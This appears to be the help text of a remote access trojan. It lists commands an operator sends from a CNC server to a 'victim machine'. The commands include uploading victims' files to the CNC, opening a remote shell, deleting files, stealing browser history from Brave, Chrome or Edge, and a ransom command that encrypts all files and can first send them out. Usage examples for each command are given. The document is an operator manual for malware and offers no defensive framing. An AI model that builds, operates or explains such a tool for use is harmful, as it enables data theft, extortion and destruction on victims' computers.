The following commands are available:

- help: shows this message
- [dir] --walk: walks to the chosen directory
- --back: walks to the parent directory
- [file] --read: reads the contents of the file
- --upload: uploads the file from the victim machine to the CNC
- --power: makes a shell to execute commands remotely from the CNC
- --ipconfig: shows the IP configuration
- --whoami: tells you what the current working directory is
- --cd| [drive='drive name, for example D:']: change directory
- [file or dir] --remove: deletes the chosen file or directory
- --mkdir | [name='folder name, for example TESTFOLDER']: makes a directory
- --mkfile | [name='file name with extension, for example test.txt']: makes a file
- [file] --write | [text='text to write', mode='file mode, for example a,wb,w,r,etc.']: writes to a file
- --browser_history | [browser='browser name, for example brave']: steals the browser's history
- --ransom | [msg='the ransom message', upload='true to upload files before encrypting or false otherwise']: encrypts all files in the directory and leaves a message for the victim

Example usage:

- To walk to the directory 'Documents':
    ```
    Documents --walk
    ```
- To read the contents of the file 'example.txt':
    ```
    example.txt --read
    ```

- To write the text 'Hello, World!' to the file 'example.txt' in append mode:
    ```
    example.txt --write text='Hello, World!' mode='a'
    ```

- To delete the directory or file 'test' in the current directory:
    ```
    test --remove
    ```
- To return to the parent directory:
    ```
    --back
    ```
- To upload a file or directory 'Example':
    ```
    Example --upload    OR  Example.txt --upload   
    
    ```
- To show the ipconfig in a text editor cnc side:
    ```
    --ipconfig
    ```
- To change the drive you are in:
    ```
    --cd|drive=DRIVE_NAME
    ```
- To make a new directory:
    ```
    --mkdir|name=DIR_NAME
    ```
- To make a new file:
    ```
    --mkfile|name=filename.extension
    ```
- To see the cwd:
    ```
    --whoami
    ```
- To steal the browser history and save it in the cnc:
    ```
    --browser_history|browser=brave or chrome or edge
    ```
- To corrupt all files in the cwd and add a message for the victim as a ransom:
    ```
    --ransom|msg=RANSOME_MESSAGE  upload=true or false    
    uplaod param will send all the files to your cnc before it corrupts it  
    ```
-- To see the full commands (not all are listed here):
    ```
    --help
    ```
